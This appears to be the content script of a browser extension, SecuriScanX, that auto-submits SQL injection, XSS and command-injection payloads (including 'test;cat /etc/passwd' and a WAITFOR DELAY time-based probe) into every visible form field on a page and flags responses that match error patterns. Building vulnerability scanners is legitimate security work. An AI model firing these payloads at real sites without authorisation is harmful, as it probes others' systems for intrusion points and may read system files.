// Content script: discover form inputs, submit payloads, report results back to popup

if (!window.__securiscanx_running) {
  window.__securiscanx_running = true;

  (function detectVulnerabilities() {
    // payload lists and error-detection regexes
    const sqlPayloads = [
      "admin'--",
      "' OR '1'='1",
      "' UNION SELECT NULL--",
      "' AND 1=2--",
      "' OR ''='",
      "' OR 1=1 LIMIT 1--",
      "\" OR \"\"=\"",
      "'; WAITFOR DELAY '0:0:5'--"
    ];
    const sqlErrorPatterns = [
      /you have an error in your sql syntax/i,
      /mysql_fetch/i,
      /syntax error/i,
      /unclosed quotation mark/i,
      /quoted string not properly terminated/i,
      /sql error/i,
      /warning.*mysql/i,
      /unknown column/i,
      /pg_query/i,
      /sqlite error/i,
      /fatal error/i,
      /odbc.*error/i,
      /invalid query/i
    ];
    
    const xssPayloads = [
      `"><script>alert('xss')</script>`,
      `'><img src=x onerror=alert('xss')>`,
      `"><svg/onload=alert('xss')>`,
      `<input onfocus=alert('xss') autofocus>`,
      `<iframe src=javascript:alert('xss')>`
    ];
    
    const cmdiPayloads = [
      'test;cat /etc/passwd',
      'test|ls',
      'test&&whoami',
      'test;echo injected',
      'test|id'
    ];

    const cmdiErrorPatterns = [
      /command not found/i,
      /No such file or directory/i,
      /sh: /i,
      /bash: /i,
      /zsh: /i,
      /syntax error/i,
      /cannot execute/i,
      /permission denied/i,
      /unexpected end of file/i
    ];

    // Track in-flight requests; when all complete send one COMPLETED info message.
    let pendingRequests = 0;
    let testsStarted = false;
    let completionSent = false;

    function maybeSendCompletion() {
      if (testsStarted && pendingRequests === 0 && !completionSent) {
        completionSent = true;
        try {
          chrome.runtime.sendMessage({
            result: true,
            type: "INFO",
            status: "COMPLETED",
            target: "page",
            payload: "Scan completed.",
            className: "success"
          });
        } catch (e) { /* ignore */ }
      }
    }

    function report(status, target, payload, type = "SQLi") {
      // normalize className and forward result to popup
      let className = "safe";
      if (status === "FAILED") className = "failed";
      if (status === "VULNERABLE") className = "vulnerable";
      else if (status === "SUSPICIOUS") className = "suspicious";

      try {
        chrome.runtime.sendMessage({
          result: true,
          type: type,
          status: status,
          target: target,
          payload: payload,
          className: className
        });
      } catch (e) {
        console.error("SecuriScanX: sendMessage failed", e);
      }
    }

    // Helper: detect visible, editable inputs in forms
    const forms = document.forms;
    for (let form of forms) {
      const inputs = form.querySelectorAll(
        "input[name]:not([type=hidden]):not([type=checkbox]):not([type=radio]):not([type=button]):not([type=submit]):not([type=reset]):not([type=file]), textarea[name]"
      );
      for (let input of inputs) {
        const editableTypes = [
          "text", "email", "password", "search", "tel", "url", "number"
        ];
        const isEditable =
          (input.tagName === "INPUT" && editableTypes.includes(input.type)) ||
          input.tagName === "TEXTAREA";
        if (!isEditable) continue;

        const style = window.getComputedStyle(input);
        const rect = input.getBoundingClientRect();
        const isVisible = (
          style.display !== "none" &&
          style.visibility !== "hidden" &&
          style.opacity !== "0" &&
          rect.width > 0 &&
          rect.height > 0
        );
        if (!isVisible) continue;

        // For each payload set and for each input, submit and inspect response text.
        // Helper to perform a fetch and evaluate response
        function runTest(payloads, type, errorPatterns = []) {
          payloads.forEach(payload => {
            testsStarted = true;
            pendingRequests += 1; // increment for this fetch

            const name = input.name;
            const action = form.action || window.location.href;
            const method = (form.method || "GET").toUpperCase();
            const formData = new FormData(form);
            formData.set(name, payload);
            const options = {
              method: method,
              body: method === "POST" ? formData : undefined,
              // keep same-origin credentials
              credentials: 'same-origin'
            };
            const targetUrl = method === "POST" ? action : action + (action.includes('?') ? '&' : '?') + new URLSearchParams(formData).toString();

            fetch(targetUrl, options)
              .then(res => res.text().catch(() => ""))
              .then(text => {
                try {
                  if (errorPatterns.length && errorPatterns.some(re => re.test(text))) {
                    input.style.border = "2px solid red";
                    report("VULNERABLE", `input: ${name}`, payload, type);
                  } else if (text && text.indexOf(payload) !== -1) {
                    input.style.border = "2px solid orange";
                    report("SUSPICIOUS", `input: ${name}`, payload, type);
                  } else {
                    input.style.border = "2px solid green";
                    report("SAFE", `input: ${name}`, payload, type);
                  }
                } catch (e) {
                  report("FAILED", `input: ${name}`, payload, type);
                }
              })
              .catch(() => {
                input.style.border = "2px solid yellow";
                report("FAILED", `input: ${name}`, payload, type);
              })
              .finally(() => {
                // decrement pending and possibly send completion
                pendingRequests -= 1;
                // small safety: ensure we never go negative
                if (pendingRequests < 0) pendingRequests = 0;
                maybeSendCompletion();
              });
          });
        }

        // Run SQLi, XSS, CMDi tests
        runTest(sqlPayloads, "SQLi", sqlErrorPatterns);
        runTest(xssPayloads, "XSS", []);
        runTest(cmdiPayloads, "CMDi", cmdiErrorPatterns);
      }
    }

    // If no forms/inputs found, notify popup so it can show a message
    const foundAny = Array.from(document.forms).some(f => f.querySelector("input[name], textarea[name]"));
    if (!foundAny) {
      try {
        chrome.runtime.sendMessage({
          result: true,
          type: "INFO",
          status: "FAILED",
          target: "page",
          payload: "No visible inputs with name attributes found.",
          className: "failed"
        });
      } catch (e) {}
    } else {
      // If tests were started but pendingRequests is zero (possible if payload arrays empty),
      // ensure completion message is sent
      maybeSendCompletion();
    }
  })();
}
